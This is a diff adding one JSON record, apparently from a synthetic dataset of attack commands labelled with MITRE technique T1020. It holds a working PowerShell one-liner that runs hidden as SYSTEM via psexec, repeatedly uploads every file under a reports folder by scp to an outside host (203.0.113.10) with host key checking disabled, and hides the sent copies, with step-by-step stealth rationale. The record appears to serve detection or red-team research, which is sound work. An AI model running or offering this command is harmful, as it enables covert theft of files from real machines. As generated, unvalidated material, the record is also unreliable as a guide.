@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$env:Path += ';C:\\Windows\\System32\\OpenSSH'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true) { Get-ChildItem 'C:\\Users\\Public\\Reports' -File -Recurse | ForEach-Object { & scp -q -o StrictHostKeyChecking=no $_.FullName user@203.0.113.10:/var/drop/ > $null 2>&1; if ($LASTEXITCODE -eq 0) { Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep -Seconds 300 }\"",
+  "explanation": "Periodically scans a reports directory and automatically exfiltrates files to an SFTP server using scp, then moves exfiltrated files to a quarantine folder to avoid duplication.",
+  "rationale_steps": [
+    "Run as hidden SYSTEM using PSExec for elevated, quiet execution.",
+    "Ensure OpenSSH in PATH for scp availability.",
+    "Loop through target directory and upload files with scp using quiet mode.",
+    "Move successfully uploaded files to C:\\ProgramData\\.sent to prevent re-exfiltration.",
+    "Sleep between cycles to minimize resource usage and network noise."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-2e5e355b",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
